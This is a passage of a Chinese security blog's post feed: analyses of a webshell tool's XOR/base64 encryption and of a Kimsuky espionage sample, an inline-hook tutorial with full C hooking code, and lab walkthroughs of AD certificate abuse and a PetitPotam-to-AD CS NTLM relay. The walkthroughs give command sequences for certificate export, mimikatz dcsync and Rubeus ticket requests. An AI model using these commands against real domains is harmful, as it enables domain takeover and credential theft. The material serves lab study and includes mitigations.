alt=""></p><p>getCryption函数</p><p>这里加密器用的PhpXor对应shells/cryptions/phpXor/PhpXor.class<br>init函数</p><pre><code>* 返回http对象* 返回配置shell设置的密钥* 返回配置shell设置的密码* md5加密pass+key* 截断取0-16</code></pre><p><img src="https://i.bmp.ovh/imgs/2021/09/7cb53e08b7bb685b.png" alt=""></p><p>check返回对应的状态<br><img src="https://i.bmp.ovh/imgs/2021/09/45892a92032b58d9.png" alt=""></p><p>这里分析的payloadModel对应shells/payloads/php/PhpShell.class</p><pre><code>* 返回http对象* 返回对应的shell编码</code></pre><p><img src="https://i.bmp.ovh/imgs/2021/09/f99a65c395d7cd8e.png" alt=""></p><p>test函数<br>（发送test关键字-&gt;加密后，判断返回数据结果解密后是否存在ok，如果是则代表成功）<br><img src="https://i.bmp.ovh/imgs/2021/09/0af41e6126380b52.png" alt=""></p><p>evalFunc函数<br>获取对应的class name添加到 ReqParameter类型中，调用format返回base64编码后的结果，并开始拼接POST传输的参数，最后调用sendHttpResponse函数发送请求<br><img src="https://i.bmp.ovh/imgs/2021/09/77b11af83b4f41e1.png" alt=""></p><p>format函数<br><img src="https://i.bmp.ovh/imgs/2021/09/32314f9b3751fef5.png" alt=""></p><p>sendHttpResponse函数经过几重包装</p><pre><code>* 将上面base64编码的结果进行最终加密* 最后POST发送pass字段</code></pre><p><img src="https://i.bmp.ovh/imgs/2021/09/98468b20d2285e45.png" alt=""></p><p>encode函数对应PHP_XOR_BASE64里的</p><pre><code>* 根据配置的密钥进行xor编码* 最后base64，拼接到pass字段</code></pre><p><img src="https://i.bmp.ovh/imgs/2021/09/03ab31c2007cd287.png" alt=""></p><p>burp捕获配置时的三个包：<br>第一个发送大马数据，返回session ID<br><img src="https://i.bmp.ovh/imgs/2021/09/2507ef51b7a27ea5.png" alt=""></p><p>第二和第三个都是对应payload的test函数<br><img src="https://i.bmp.ovh/imgs/2021/09/706a3bd4df8d6d59.png" alt=""></p><p>完成这些步骤之后，调用对应的功能就是调用大马里对应的函数<br>参考链接:<a href="https://www.freebuf.com/sectool/285693.html" target="_blank" rel="noopener">https://www.freebuf.com/sectool/285693.html</a></p>]]></content>
      
      
        <tags>
            
            <tag> 工具刨析 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Kimsuky 间谍活动分析</title>
      <link href="/posts/5c51f955.html"/>
      <url>/posts/5c51f955.html</url>
      <content type="html"><![CDATA[<p>事件背景:韩国外交部文件及其通讯的诱饵<br>样本地址：<a href="https://www.virustotal.com/gui/file/a30afeea0bb774b975c0f80273200272e0bc34e3d93caed70dc7356fc156ffc3/detection" target="_blank" rel="noopener">https://www.virustotal.com/gui/file/a30afeea0bb774b975c0f80273200272e0bc34e3d93caed70dc7356fc156ffc3/detection</a><br><img src="https://z3.ax1x.com/2021/08/27/hKMneI.png" alt=""></p><p>type：Javascript<br>sha256：20eff877aeff0afaa8a5d29fe272bdd61e49779b9e308c4a202ad868a901a5cd<br>size：27.31 MB（28634023 字节）</p><p>一共有两段base64<br>打开是一段js解码base64写入诱饵pdf，第二段base64解码后在利用certutil解码得到UPX加壳的dll<br><img src="https://z3.ax1x.com/2021/08/27/hKMKTP.png" alt=""></p><p>regsvr32调用dll<br><img src="https://z3.ax1x.com/2021/08/27/hKMlY8.png" alt=""></p><p>诱饵PDF如下<br><img src="https://z3.ax1x.com/2021/08/27/hKMGlQ.png" alt=""></p><p>脱了UPX壳后的dll<br>sha256：ae50cf4339ff2f2b3a50cf8e8027b818b18a0582e143e842bf41fdb00e0bfba5<br>type：DLL x64<br>size：474.50 KB（485888 字节）<br><img src="https://z3.ax1x.com/2021/08/27/hKMJyj.png" alt=""></p><p>由于混淆严重，整体分析过程如下：<br><img src="https://z3.ax1x.com/2021/08/27/hKMYOs.png" alt=""></p><p>先反调试检查，遍历所有设备，查看对应设备的目录，然后提取.txt,hwp,.pdf,.doc,.xls,.ppt后缀的文件最后文件上传,键盘输入hook匹配到<br>指定的字符串写入到log.txt最后回传，注册表写入dll所在路径开机自启regsvr32<br><img src="https://z3.ax1x.com/2021/08/27/hKMfk6.png" alt=""></p><p>（反调试检查）<br><img src="https://z3.ax1x.com/2021/08/27/hKMo1e.png" alt=""></p><p>（遍历所有设备）<br><img src="https://z3.ax1x.com/2021/08/27/hKMq0I.png" alt=""></p><p>（获取C盘目录下的文件）<br><img src="https://z3.ax1x.com/2021/08/27/hKMjtf.png" alt=""></p><p>（搜索指定后缀的文件）<br><img src="https://z3.ax1x.com/2021/08/27/hKMvh8.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/08/27/hKQpcQ.png" alt=""></p><p>（键盘输入Hook，输入某些字符串匹配后写入到log.txt）<br><img src="https://z3.ax1x.com/2021/08/27/hKQ9Xj.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/08/27/hKQENV.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/08/27/hKQAA0.png" alt=""></p><p>（文件上传到远端）<br><img src="https://z3.ax1x.com/2021/08/27/hKQe9U.png" alt=""></p><p>参考链接:<a href="https://inquest.net/blog/2021/08/23/kimsuky-espionage-campaign" target="_blank" rel="noopener">https://inquest.net/blog/2021/08/23/kimsuky-espionage-campaign</a></p>]]></content>
      
      
        <tags>
            
            <tag> 恶意分析 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Inline Hook研究</title>
      <link href="/posts/3d0703bd.html"/>
      <url>/posts/3d0703bd.html</url>
      <content type="html"><![CDATA[<p>Inline Hook是在程序调用某个API函数之前，在其上方设置指令跳转到自己写的的函数</p><h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><p>Hoo kMessageBox测试<br>x86思路如下:</p><pre><code>1.调用 GetModuleHandle 来获取到模块的基址(user32.dll)2.调用 GetProcAddress 获取到MessageBoxA弹窗的基址3.调用 VirtualProtect 来修改MsgBox前5个字节内存属性4.计算 Dest - MsgBox - 5 重定位跳转地址，并Jmp跳转5.计算 Dest + Offset + 5 = MsgBox +5 跳转回来</code></pre><p>疑问：为什么是5个字节？，jmp指令的机器码刚好5字节 </p><pre><code>E9 87 FE FF FF</code></pre><p><img src="https://i.bmp.ovh/imgs/2021/08/5fa3973bebe61edb.png" alt=""></p><p>而在调用MessageBoxA API之前的保存栈堆新开堆栈时刚好够5字节（机器码共5个字节，<strong>这种情况适用于大部分API但并非全部API都适用</strong>）</p><pre><code>8B FF mov edi,pdi55 push ebp //新栈顶8B EC mov ebp,esp //保留堆栈Hook后这些指令就变成了一条jmp指令</code></pre><p><img src="https://i.bmp.ovh/imgs/2021/08/e50facfac63f4c54.png" alt=""></p><p>最终在OD类似如下<br><img src="https://i.bmp.ovh/imgs/2021/08/639e3b28efd2c5ea.png" alt=""></p><p>x86内嵌asm hook实现如下：</p><pre><code class="c">#include &quot;stdafx.h&quot;#include &lt;windows.h&gt;#include &lt;stdio.h&gt;typedef int (WINAPI        *MessageBox_type) (               __in_opt HWND hWnd,               __in_opt LPCSTR lpText,               __in_opt LPCSTR lpCaption,               __in UINT uType);MessageBox_type RealMessageBox = MessageBoxA;//我们自己的MessageBox，每调用MessageBox都要跳到myMessageBox来处理_declspec(naked)  void WINAPImyMessageBox(        __in_opt HWND hWnd,        __in_opt LPCSTR lpText,        __in_opt LPCSTR lpCaption,        __in UINT uType){        __asm        {               PUSH ebp               mov ebp, esp               /*               vs2010 debug 编译后的代码由于要cmp esi esp来比较堆栈。               所以这里在调用非__asm函数前push一下esi               */               push esi        }        //下面打印MessageBox参数        printf(&quot;hwnd:%8X lpText:%s lpCaption:%s,uType:%8X&quot;, hWnd, lpText, lpCaption,  uType);        __asm        {               /*               vs2010 debug 编译后的代码由于要cmp esi esp来比较堆栈。               所以这里在调用非__asm函数前push一下esi               */               pop esi               mov ebx, RealMessageBox               add ebx, 5 //地址恢复避免重复hook               jmp ebx        }}#pragma pack(1)typedef struct _JMPCODE{        BYTE jmp;        DWORD addr;}JMPCODE, *PJMPCODE;VOID HookMessageBoxA(){        JMPCODE jcode;        jcode.jmp = 0xe9;//jmp        jcode.addr = (DWORD)myMessageBox - (DWORD)RealMessageBox - 5; //自己的函数地址-MessageBox基址-jmp指令大小        RealMessageBox = MessageBoxA;        ::WriteProcessMemory(GetCurrentProcess(), MessageBoxA, &amp;jcode, sizeof(JMPCODE),  NULL);}BOOL APIENTRY DllMain( HMODULE hModule,                       DWORD  ul_reason_for_call,                       LPVOID lpReserved                                       ){        switch (ul_reason_for_call)        {        case DLL_PROCESS_ATTACH:               HookMessageBoxA();  //hook操作               MessageBoxA(NULL, &quot;HOOK&quot;, &quot;HOOKKKKKK&quot;, MB_OK);               break;        case DLL_THREAD_ATTACH:        case DLL_THREAD_DETACH:        case DLL_PROCESS_DETACH:               break;        }        return TRUE;}</code></pre><p><img src="https://i.bmp.ovh/imgs/2021/08/3500eae2f47e893c.png" alt=""></p><p>x64如下<br>1.备份原来的指令<br>2.8个0x90替换为要跳转的函数地址<br>3.自己的函数中要执行的内容<br>4.恢复原来的指令</p><pre><code class="c">#include &quot;stdafx.h&quot;#include &lt;windows.h&gt;#include &lt;stdio.h&gt;BYTE oldcode[12] = { 0x00 };BYTE HookCode[12] = { 0x48, 0xB8, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0xFF,   0xE0 };void HookFunction(LPVOID lpFunction) {        DWORD_PTR FuncAddress = (UINT64)GetProcAddress(GetModuleHandleA(&quot;user32.dll&quot;),  &quot;MessageBoxA&quot;);        DWORD offset = 0;        if (VirtualProtect((LPVOID)FuncAddress, 12, PAGE_EXECUTE_READWRITE, &amp;offset)) {               memcpy(oldcode, (LPVOID)FuncAddress, 12); // 拷贝原始机器码指令到oldcode               *(PINT64)(HookCode + 2) = (UINT64)lpFunction; //填充90为指定跳转地址    (0x90修改为要跳转的地址)        }        memcpy((LPVOID)FuncAddress, &amp;HookCode, sizeof(HookCode)); //拷贝hook指令        VirtualProtect((LPVOID)FuncAddress, 12, offset, &amp;offset); //还原页面保护属性}void UnHookFunction() {        DWORD offset = 0;        DWORD_PTR FuncAddress = (UINT64)GetProcAddress(GetModuleHandleA(&quot;user32.dll&quot;),  &quot;MessageBoxA&quot;);        if (VirtualProtect((LPVOID)FuncAddress, 12, PAGE_EXECUTE_READWRITE, &amp;offset)) {               memcpy((LPVOID)FuncAddress, oldcode, sizeof(oldcode)); //恢复原来的机器指令        }        VirtualProtect((LPVOID)FuncAddress, 12, offset, &amp;offset);//还原页面保护属性}int WINAPI TestMessageBoxA(HWND hwnd, LPCSTR lpText, LPCSTR lpcaption, UINT utype) {        UnHookFunction(); //取消hook        int ret = MessageBoxA(0, &quot;HOOK&quot;, &quot;title&quot;, MB_OK);        HookFunction((PROC)TestMessageBoxA); //继续hook        return ret;}BOOL APIENTRY DllMain(HMODULE hModule,        DWORD  ul_reason_for_call,        LPVOID lpReserved){        switch (ul_reason_for_call)        {        case DLL_PROCESS_ATTACH:               HookFunction((PROC)TestMessageBoxA);               break;        case DLL_THREAD_ATTACH:        case DLL_THREAD_DETACH:        case DLL_PROCESS_DETACH:               break;        }        return TRUE;}</code></pre><p>结果如下：<br><img src="https://i.bmp.ovh/imgs/2021/08/751af19c5be90b0c.png" alt=""></p><p>HookCode刨析：<br><img src="https://i.bmp.ovh/imgs/2021/08/b44d6d77e50cacb0.png" alt=""></p><p>x86话的HookCode为E9 00 00 00 00 （另外个执行例子）还需要减去5字节的便宜地址<br><img src="https://i.bmp.ovh/imgs/2021/08/0a49ec7f3aec9db7.png" alt=""></p><p>x86非内嵌asm，x86要将自己函数处理的地址-被Hook函数+5得出的偏移地址 (至于为什么我也不知道，原文写的不清不楚)</p><pre><code class="c">#include &quot;stdafx.h&quot;#include &lt;windows.h&gt;#include &lt;stdio.h&gt;BYTE oldcode[5] = { 0x00 };BYTE HookCode[5] = { 0xe9, 0x0, 0x0, 0x0, 0x0 };void HookFunction(LPVOID lpFunction) {        DWORD_PTR FuncAddress = (UINT32)GetProcAddress(GetModuleHandleA(&quot;user32.dll&quot;),  &quot;MessageBoxA&quot;);        DWORD offset = 0;        DWORD dfset = 0;        dfset = (DWORD)lpFunction - ((DWORD)FuncAddress + 5); //偏移地址计算        if (VirtualProtect((LPVOID)FuncAddress, 5, PAGE_EXECUTE_READWRITE, &amp;offset)) {               memcpy(oldcode, (LPVOID)FuncAddress, 5); // 拷贝原始机器码指令到oldcode               *(PINT32)(HookCode + 1) = (UINT32)dfset; //填充90为指定跳转地址    (0x90修改为要跳转的地址)        }        memcpy((LPVOID)FuncAddress, &amp;HookCode, sizeof(HookCode)); //拷贝hook指令        VirtualProtect((LPVOID)FuncAddress, 5, offset, &amp;offset); //还原页面保护属性}void UnHookFunction() {        DWORD offset = 0;        DWORD_PTR FuncAddress = (UINT32)GetProcAddress(GetModuleHandleA(&quot;user32.dll&quot;),  &quot;MessageBoxA&quot;);        if (VirtualProtect((LPVOID)FuncAddress, 5, PAGE_EXECUTE_READWRITE, &amp;offset)) {               memcpy((LPVOID)FuncAddress, oldcode, sizeof(oldcode)); //恢复原来的机器指令        }        VirtualProtect((LPVOID)FuncAddress, 5, offset, &amp;offset);//还原页面保护属性}int WINAPI TestMessageBoxA(HWND hwnd, LPCSTR lpText, LPCSTR lpcaption, UINT utype) {        UnHookFunction(); //取消hook        int ret = MessageBoxA(0, &quot;HOOK&quot;, &quot;title&quot;, MB_OK);        HookFunction((PROC)TestMessageBoxA); //继续hook        return ret;}BOOL APIENTRY DllMain(HMODULE hModule,        DWORD  ul_reason_for_call,        LPVOID lpReserved){        switch (ul_reason_for_call)        {        case DLL_PROCESS_ATTACH:               HookFunction((PROC)TestMessageBoxA);               break;        case DLL_THREAD_ATTACH:        case DLL_THREAD_DETACH:        case DLL_PROCESS_DETACH:               break;        }        return TRUE;}</code></pre><p><img src="https://i.bmp.ovh/imgs/2021/08/2a7df4e7221353fb.png" alt=""></p><p>其他例子SetConsoleTitleW Hook<br><img src="https://i.bmp.ovh/imgs/2021/08/f41515400193bf8d.png" alt=""></p><p>Hook如下，一执行命令cmd的标题就会被更改<br><img src="https://i.bmp.ovh/imgs/2021/08/621519e81c080c2d.png" alt=""></p><p><strong>总的来说x86用内嵌asm，x64用memcpy插机器码</strong></p><h2 id="DetOurs库的使用"><a href="#DetOurs库的使用" class="headerlink" title="DetOurs库的使用"></a>DetOurs库的使用</h2><p>这玩意x64是商业版（<br>github地址:<a href="https://github.com/Microsoft/Detours" target="_blank" rel="noopener">https://github.com/Microsoft/Detours</a><br>下完进入到目录，用vs命令行的nmake编译。然后将lib和include添加到项目<br><img src="https://z3.ax1x.com/2021/08/19/f7sgvd.png" alt=""></p><p>Hook MessageBoxA</p><pre><code class="c">#include &quot;stdafx.h&quot;#include &lt;detours.h&gt;#pragma comment(lib,&quot;detours.lib&quot;)static INT(WINAPI *OldMessageBoxA)(HWND, LPCSTR, LPCSTR, UINT) = MessageBoxA; //定义被Hook的API函数原型INT WINAPI MyMessAgeBoxA(HWND, LPCSTR, LPCSTR, UINT) {        OldMessageBoxA(NULL, &quot;Hook&quot;, &quot;Title&quot;, MB_OK); //注意调用的被hook的函数时要使用自己定义的，否则会崩溃        return 0;}BOOL APIENTRY DllMain( HMODULE hModule,                       DWORD  ul_reason_for_call,                       LPVOID lpReserved                                       ){        int ts;        switch (ul_reason_for_call)        {        case DLL_PROCESS_ATTACH:               ts = DetourTransactionBegin();               if (ts == NO_ERROR) {                       DetourUpdateThread(GetCurrentThread());                       DetourAttach(&amp;(PVOID&amp;)OldMessageBoxA, MyMessAgeBoxA);                       DetourTransactionCommit();               }               break;        case DLL_THREAD_ATTACH:        case DLL_THREAD_DETACH:        case DLL_PROCESS_DETACH:               break;        }        return TRUE;}</code></pre><p><img src="https://z3.ax1x.com/2021/08/19/f7sWDI.png" alt=""></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.cnblogs.com/LyShark/p/11692436.html" target="_blank" rel="noopener">https://www.cnblogs.com/LyShark/p/11692436.html</a><br><a href="https://developer.aliyun.com/article/568432" target="_blank" rel="noopener">https://developer.aliyun.com/article/568432</a><br><a href="https://www.write-bug.com/article/1851.html" target="_blank" rel="noopener">https://www.write-bug.com/article/1851.html</a></p>]]></content>
      
      
        <tags>
            
            <tag> 红队 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>滥用证书私钥</title>
      <link href="/posts/75f27601.html"/>
      <url>/posts/75f27601.html</url>
      <content type="html"><![CDATA[<p>七夕放首老婆的歌</p><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=484058598&auto=1&height=66"></iframe><p>原文链接：<a href="https://www.4hou.com/posts/w2og" target="_blank" rel="noopener">https://www.4hou.com/posts/w2og</a><br>安装证书服务就不说了，自己搜去弄</p><h2 id="理论知识"><a href="#理论知识" class="headerlink" title="理论知识"></a>理论知识</h2><blockquote><p>在传统的kerberos认证的时候，是使用用户密码进行认证的。回顾下申请TGT的过程。<br>用用户hash加密时间戳作为value，type为PA-ENC-TIMESTAMP， 放在PA_DATA上。KDC收到请求，使用用户hash解密value的值得到时间戳跟当前时间做比对，如果在合理的范围(正常五分钟)，就认证通过。<br>事实上也可以使用证书作为认证，这也是这次spectorops关于ADCS研究的最大亮点，后面漏洞紧紧围绕这点。<br>RFC4556引入了对 Kerberos 预身份验证的公钥加密支持。这个RFC 的title是Public Key Cryptography for Initial Authentication in Kerberos，后面我们使用简称PKINIT来介绍使用证书进行kerberos身份认证这种方法。<br>PKINIT同样也使用时间戳，但不是使用用户密码派生密钥加密消息，而是使用属于证书的私钥对消息进行签名。</p></blockquote><h2 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h2><p>DC windows server 2019<br>AD CS Windows Server 2008<br>非域内机器windows 7</p><h2 id="测试准备"><a href="#测试准备" class="headerlink" title="测试准备"></a>测试准备</h2><p>certtmlp.msc - 证书模板控制台<br>certsrv.msc - 证书颁发机构<br>certmgr.msc - 证书管理</p><p>给一域用户安装个用户证书<br>win+r运行certmgr.msc，选择个人，右键，所有任务-&gt;申请新证书。请求证书选择用户（即可生成当前用户的一个证书）<br><img src="https://z3.ax1x.com/2021/08/14/fsXTFU.png" alt=""></p><p>安装后如下<br><img src="https://z3.ax1x.com/2021/08/14/fsX7YF.png" alt=""></p><p>执行certutil -user -store My可以看到用户证书<br><img src="https://z3.ax1x.com/2021/08/14/fsXLl9.png" alt=""></p><h2 id="场景模拟"><a href="#场景模拟" class="headerlink" title="场景模拟"></a>场景模拟</h2><p>假设一台域内机器带有一个用户证书要怎么利用他?<br>先把这个证书dump下来（需要包括私钥）可以用certutil或者直接用certmgr.msc dump</p><pre><code>certutil -user -exportPFX &lt;SHA1 hash&gt; test1.pfx</code></pre><p>（dump的时候需要给证书设置个密码(如果该证书默认没密码的话)）<br><img src="https://z3.ax1x.com/2021/08/14/fsXOyR.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/08/14/fsXXO1.png" alt=""></p><p>（使用certutil导出）<br><img src="https://z3.ax1x.com/2021/08/14/fsXzTK.png" alt=""></p><p>这里有一种情况不能通过这两种方式dump，有些证书在导入的时候需要密码或者<strong>不勾选标志此密钥为可导出的密钥</strong>，需要mimikatz dump<br><img src="https://z3.ax1x.com/2021/08/14/fsj9YD.png" alt=""></p><p>dump出现如下问题<br><img src="https://z3.ax1x.com/2021/08/14/fsjiSH.png" alt=""></p><p>使用mimikatz的crypto::capi修改lsass，然后在dump （这个报错也不影响，具体原因不知）<br>（这证书dump下来如果导入的时候设置了密码也没用，验证根本过不了，也不知道有啥用）</p><pre><code>crypto::capi #修改lsasscrypto::certificates /systemstore:local_machine /store:my /export</code></pre><p>（没以administrator权限执行）<br><img src="https://z3.ax1x.com/2021/08/14/fsjk6A.png" alt=""></p><p>（以administrator权限执行）<br><img src="https://i.bmp.ovh/imgs/2021/08/decd25cc3ceaa229.png" alt=""></p><p>尝试用Rubeus进行申请票据<br>知道证书密码或者dump证书的时候没设置不可dump可自己设置密码</p><pre><code>Rubeus.exe asktgt /user:csadmin /password:123456 /certificate:admin.pfx /domain:joker.local /dc:WIN-0ASLVBO5ID9.joker.local #123456是私钥密码(dump证书的时候设置的)</code></pre><p><img src="https://i.bmp.ovh/imgs/2021/08/3f344d91d72244e3.png" alt=""></p><h2 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h2><p>理论点<br><img src="https://i.bmp.ovh/imgs/2021/08/a735763c31d0fe83.png" alt=""></p><p><strong>在域内利用</strong><br>Rubeus.exe申请票据导入到当前进程，然后获取hash用wmiexec.py连接之类的<br>（清空原有的票据进行测试）<br><img src="https://i.bmp.ovh/imgs/2021/08/f4dd4b544a516e3e.png" alt=""></p><p>Rubeus进行申请票据<br><img src="https://i.bmp.ovh/imgs/2021/08/aa2df3a2f23d4cb5.png" alt=""></p><p>获取hash<br><img src="https://i.bmp.ovh/imgs/2021/08/3969335a61d64673.png" alt=""></p><p><strong>不在域内利用</strong><br>将pfx移动到win7，并导入证书。在hosts文件添加域控IP和加入被控制机器的IP和机器名或者DNS改为域控的IP （代理进内网）<br><img src="https://i.bmp.ovh/imgs/2021/08/ed2393d62b472888.png" alt=""></p><p>利用keke获取ntlm，然后用wmiexec.py连接之类的</p><pre><code>tgt::pac /subject:csadmin /castore:current_user /domain:joker.local</code></pre><p><img src="https://i.bmp.ovh/imgs/2021/08/0cf25ddee50a166f.png" alt=""></p><p>直接利用mimikatz令牌注入用psexec连接AD CS服务器<br>（pth ntlm到新进程psexec连接）<br><img src="https://i.bmp.ovh/imgs/2021/08/c08063c93c568bc2.png" alt=""></p><h2 id="常见搜索证书的位置"><a href="#常见搜索证书的位置" class="headerlink" title="常见搜索证书的位置"></a>常见搜索证书的位置</h2><blockquote><p>我们经常可以在邮件，磁盘里面看到证书，我们一般按照后缀来搜索证书的，我们一般关注以下后缀<br>1、key后缀的，只包含私钥<br>2、crt/cer 后缀的，只包含公钥<br>3、csr后缀的，证书申请文件，不包含公钥，也不包含私钥。没啥用<br>4、pfx,pem,p12后缀的，包含公私钥，我们最喜欢的。<br>搜索文件后缀的每个人使用的工具不一样，我个人比较喜欢的是SharpSearch，.Net的项目，支持内存加载，可以写成CNA插件。</p></blockquote>]]></content>
      
      
        <tags>
            
            <tag> 域渗透 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>使用PetitPotam到NTLM中继到域管理员</title>
      <link href="/posts/d55c75ac.html"/>
      <url>/posts/d55c75ac.html</url>
      <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote><p>最近披露的几个漏洞，分别是：</p><ul><li>MS-EFSRPC – 又名 PetitPotam</li><li>滥用 AD CS 角色的凭证中继<br>任何具有内部网络访问权限的攻击者（例如网络中的网络钓鱼客户端或恶意植入设备）都可以在没有任何初始凭据的情况下接管整个 Active Directory 域。当前在默认配置中，域控制器和 AD CS 容易受到这种攻击。<br>当 PetitPotam 被利用并将 NTLM 凭据中继到 Active Directory 证书服务时，攻击者无需事先对域进行任何身份验证即可获得域管理员权限。本文将详细介绍漏洞利用所需的步骤，然后介绍 PetitPotam 的缓解措施。<br>攻击者可以使用 PetitPotam 触发域控制器以将 NTLM 凭据中继到所选主机。然后可以将域控制器的 NTLM 凭据中继到 Active Directory 证书服务 (AD CS) Web 注册页面，并且可以注册 DC 证书。然后可以使用此证书来请求 TGT（票证授予票证）并通过 Pass-The-Ticket 破坏整个域。<br>AD CS（Active Directory 证书服务）特别有趣，因为<strong>它提供默认接受基于 NTLM 的身份验证的角色服务。这些服务具体包括证书颁发机构 Web 注册和证书注册 Web 服务。</strong></li></ul></blockquote><h2 id="准备环境"><a href="#准备环境" class="headerlink" title="准备环境"></a>准备环境</h2><p>这几天踩的坑点：不能在DC安装AD证书服务进行测试，必须分开安装，具体情况是反射自身出问题还是什么不知道<br>DC: Windows Server 2019  IP:192.168.93.246<br>AD CS(证书服务器):Windows Server 2008 IP:192.168.93.141<br>Attack Kali IP:192.168.93.133</p><p>准备的工具:</p><ul><li>Rubeus 1.6.4</li><li>mimikatz</li><li>impacket分支(ntlmrelayx-adcs-attack)</li></ul><p>环境搭建过程：<br>（由小离提供的教程）<br><a href="https://github.com/422926799/note/blob/master/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E4%BD%BF%E7%94%A8%20PetitPotam%20%E5%88%B0%20NTLM%20%E4%B8%AD%E7%BB%A7%E5%88%B0%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.pdf" target="_blank" rel="noopener">https://github.com/422926799/note/blob/master/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E4%BD%BF%E7%94%A8%20PetitPotam%20%E5%88%B0%20NTLM%20%E4%B8%AD%E7%BB%A7%E5%88%B0%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.pdf</a></p><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><ul><li>证书注册 Web 界面，通过安装证书颁发机构 Web 注册角色。作为在http://<adcsserver>/certsrv/ 上运行的 IIS 托管的 ASP Web 注册应用程序公开</adcsserver></li><li>证书注册服务 (CES)，通过安装证书注册 Web 服务角色。通过安装证书注册策略 Web 服务角色，与证书注册策略 (CEP) Web 服务协同工作。白皮书中的详细信息。</li><li>网络设备注册服务 (NDES)，通过安装网络设备注册服务 角色。作为白皮书中描述的一系列接口公开。</li><li>注册 HTTP 端点没有启用 HTTPS/没有启用任何 NTLM 中继保护（默认允许NTLM）</li><li>GPO 禁用 NTLM 身份验证或将关联的 IIS 应用程序配置为仅接受 Kerberos 身份验证</li></ul><h2 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h2><ol><li>使用 PetitPotam 触发从域控制器到侦听器的 NTLM 身份验证（运行响应程序或 ntlmrelayx）</li><li>使用 ntlmrelayx 使用“KerberosAuthentication”或“DomainControllers”AD CS 模板将 DC 的凭据中继到启用了 Web 注册（必须启用 NTLM 身份验证并默认启用）的 AD CS（Active Directory 证书服务）服务器。</li><li>获取通过NTLM中继获取的Base64 PKCS12证书</li><li>使用Base64 PKCS12 cert导入Kekeo请求TGT（Ticket Granting Ticket）</li><li>使用 mimikatz 为选择的用户（管理员、Krbtgt 等）转储 LSA 机密</li><li>记下域管理员用户的 NT 哈希值</li><li>使用 wmiexec 以该用户身份获得对域控制器的执行并执行 NT 哈希的哈希传递</li></ol><p>前三步流程图<br><img src="https://z3.ax1x.com/2021/08/07/fMckuT.png" alt=""></p><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>下载新版impacket切换到ntlmrelayx-adcs-attack分支</p><pre><code>git clone https://github.com/ExAndroidDev/impacket.git # Clone the custom ntlmrelayx repocd impacketgit checkout ntlmrelayx-adcs-attack # checkout to the right branch - this caught me outsudo pip3 install -r requirements.txtsudo python3 setup.py install</code></pre><p>开启监听</p><pre><code>sudo python3 ntlmrelayx.py -debug -smb2support --target http://192.168.93.246/certsrv/certfnsh.asp --adcs --template DomainController</code></pre><p>注：这里模板必须要用DomainController，否则出现以下问题<br><img src="https://z3.ax1x.com/2021/08/07/fMgCIH.jpg" alt=""></p><p><img src="https://z3.ax1x.com/2021/08/07/fMgwFJ.png" alt="开启监听"></p><p>证书机器执行</p><pre><code>PetitPotam.exe &lt;Attack_IP&gt; &lt;DC_IP&gt;</code></pre><p><img src="https://z3.ax1x.com/2021/08/07/fMgfFH.png" alt="（执行后在监听那边可以收到base64，这里可能不会出现Attack Sucess关键字但还是成功的）"></p><p><img src="https://z3.ax1x.com/2021/08/07/fMgLTg.png" alt=""></p><p>利用Rubeus获取TGT导入到当前进程</p><pre><code>Rubeus.exe asktgt /outfile:kirbi /user:WIN-0ASLVBO5ID9$ /ptt /certificate:&lt;Base64&gt; #这里的/user为/user:&lt;DC的机器名&gt;$</code></pre><p><img src="https://z3.ax1x.com/2021/08/07/fM2fBT.png" alt=""></p><p>利用mimikatz导出域管哈希</p><pre><code>lsadump::dcsync /user:Administrator</code></pre><p><img src="https://z3.ax1x.com/2021/08/07/fM2IN4.png" alt=""></p><p>wmicexec.py连接即可<br><img src="https://z3.ax1x.com/2021/08/07/fMRPgI.png" alt=""></p><p>或者也可以dump krbtgt的hash生成金票<br><img src="https://z3.ax1x.com/2021/08/07/fMRADf.png" alt=""></p><h2 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h2><p>IIS关闭NTLM验证<br><img src="https://z3.ax1x.com/2021/08/07/fMRK8s.png" alt=""></p><p>只允许kerberos验证<br><img src="https://z3.ax1x.com/2021/08/07/fMR1K0.png" alt=""></p><p>GPO关闭NTLM身份验证<br><img src="https://z3.ax1x.com/2021/08/07/fMRJVU.png" alt=""></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.truesec.com/2021/08/05/from-stranger-to-da-using-petitpotam-to-ntlm-relay-to-active-directory/" target="_blank" rel="noopener">https://blog.truesec.com/2021/08/05/from-stranger-to-da-using-petitpotam-to-ntlm-relay-to-active-directory/</a><br><a href="https://www.youtube.com/watch?v=K0N90sI_GhI" target="_blank" rel="noopener">https://www.youtube.com/watch?v=K0N90sI_GhI</a></p>]]></content>
      
      
        <tags>
            
            <tag> 域渗透 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>透明部落近期利用印度国防部会议记录为诱饵的攻击活动分析</title>
